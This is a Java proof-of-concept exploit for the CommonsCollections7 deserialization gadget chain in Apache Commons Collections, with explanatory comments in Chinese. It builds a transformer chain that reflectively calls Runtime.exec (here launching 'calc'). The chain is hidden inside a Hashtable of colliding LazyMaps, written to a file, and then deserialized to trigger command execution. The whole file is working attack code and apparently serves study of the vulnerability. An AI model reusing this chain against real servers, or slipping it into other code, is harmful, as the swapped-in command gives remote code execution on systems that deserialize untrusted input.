import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.AbstractMap;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CommonsCollections7 {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException, IOException {
        //lazymap.get()->factory[constructor].transform()
        /*
         * 客户端构造payload，并序列化文件
         * */

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),//返回Runtime Class
                //获取getRuntime方法
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime",null}),
                //call getRuntime方法得到Runtime实例
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
                //创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"})
        };
        //将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{});//这里我们传入假的transformer，实际为空

        Map innerMap = new HashMap();
        innerMap.put("yy","2");
        Map lazyMap = LazyMap.decorate(innerMap,chainedTransformer);//return a new lazyMap

        Map innerMap2 = new HashMap();
        innerMap2.put("zZ","2");
        Map lazyMap2 = LazyMap.decorate(innerMap2,chainedTransformer);//return a new lazyMap


        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap,1);
        hashtable.put(lazyMap2,2);

        Field field = chainedTransformer.getClass().getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(chainedTransformer,transformers);
        lazyMap2.remove("yy");

        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream("lz.cer");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(hashtable);//序列化
        objectOutputStream.flush();
        objectOutputStream.close();
        fileOutputStream.close();
        /*
         * 服务端反序列化读取，并触发漏洞
         * */
        //反序列化
        FileInputStream fileInputStream = new FileInputStream("lz.cer");
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();//只需要readObject()就会触发漏洞


    }
}
